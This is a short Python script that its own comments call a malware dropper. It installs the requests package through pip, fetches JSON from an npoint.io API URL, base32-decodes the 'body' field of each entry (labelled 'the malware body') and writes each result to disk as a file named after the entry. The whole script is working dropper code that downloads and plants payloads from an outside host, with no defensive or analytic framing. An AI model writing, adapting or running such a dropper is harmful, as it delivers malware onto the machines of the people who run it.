import pip

# The API url fetch the json dropper
URL = "https://api.npoint.io/531896996f8103fa82c3"
# The pip packages to install
packages = ["requests"]

def install_package(package_name):
    # Will install the packages requirements for the script to run.
    while True:
        try:
            pip.main(["install", package_name])
            break
        except Exception:
            continue

def main():
    import base64, requests
    # Getting the response from the api server
    response = requests.get(url=URL).json()
    # Looping throw the keys in the json format
    for index, key in enumerate(response):
        # Create new file name via the index and file name
        filename = response[key]["fullName"].split(".")
        extension = filename[-1]
        # check if there is more than one dot in the file name
        if len(filename) > 2:
            filename = ".".join(filename[:-1])
        # Inserting the malware body into the new file name
        with open(f"{filename[0]}_{index}.{extension}", "wb") as file:
            # Fetch the body of the malware
            malware = response[key]["body"]
            # Encoding the body back to binary format
            decoded = malware.encode("utf-8")
            # Decoding the body to insert into the file
            decoded = base64.b32decode(decoded)
            file.write(decoded)


if __name__ == '__main__':
    # Install packages
    for package in packages:
        install_package(package)
    # Start the script
    main()